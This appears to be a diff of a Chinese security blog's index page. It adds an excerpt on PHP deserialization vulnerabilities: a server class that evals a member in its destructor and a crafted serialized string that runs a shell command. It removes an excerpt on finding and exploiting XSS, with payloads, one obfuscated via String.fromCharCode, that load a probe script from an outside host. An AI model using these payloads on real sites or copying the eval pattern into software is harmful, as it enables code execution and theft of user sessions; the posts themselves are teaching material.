@@ -83,6 +83,62 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/php-unserialize-vulnerabilities/">PHP反序列化漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-25</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
+反序列化：使用函数unserialize()可将序列化的字符串还原
+ 服务端有test.php，代码如下  &lt;?php class fun{ public $msg; function __construct(){ echo '__construct'; } function __destruct() { eval($this-&gt;msg); } } $d = $_REQUEST['str']; var_dump($d); echo &quot;&lt;br /&gt;&quot;; $tc = unserialize($d); var_dump($tc); ?&gt;   客户端可构造如下代码生成序列化后的字符串  &lt;?php class fun{ public $msg; function __construct(){ echo '__construct'; } function __destruct() { eval($this-&gt;msg); } } $f = new fun(); $f-&gt;msg = &quot;system('ls /etc/ssh');&quot;; echo serialize($f); ?&gt;  生成的序列化字符串为：O:3:&quot;fun&quot;:1:{s:3:&quot;msg&quot;;s:22:&quot;system('ls /etc/ssh');&quot;;}
+    </p>
+
+    
+    <footer>
+        <a href="/posts/php-unserialize-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/code-execution-vulnerabilities/">代码执行漏洞(一)</a></h2>
 
         
@@ -567,70 +623,6 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/xss-use-and-defense/">XSS漏洞挖掘与利用</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-15</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xss">xss</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 XSS的检测 检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
-手工检测：检测结果准确，但对于大型web来说费时费力
-软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
-检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
- 手工检测
-可得知输出位置: • 输入敏感字符，如&lt;、&gt;、&quot;、'、()等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&lt;&gt;&quot;&amp;'()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&lt;div&gt;XSS Test&lt;/div&gt; 在属性内：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;XSS Test&quot; /&gt; 这种情况通常采用输入&quot;/&gt;XSS Test来测试。  全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
-专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
-一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
-  0x01 XSS的挖掘与利用  XSS漏洞挖掘
-反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
-• &lt;script src='http://b.ioio.pub/xss/probe.js'&gt;&lt;/script&gt; • &lt;img src=x onerror=&quot;s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'&quot;;&gt; • &lt;svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js&gt; • &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &gt;   0x03 XSS简单示例 反射型xss简单示例: • &lt;?
-    </p>
-
-    
-    <footer>
-        <a href="/posts/xss-use-and-defense/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -692,7 +684,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(76)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(77)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -904,7 +896,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
-                <sup>4</sup>
+                <sup>5</sup>
             </p>
         
             <p style="display:inline-block;">
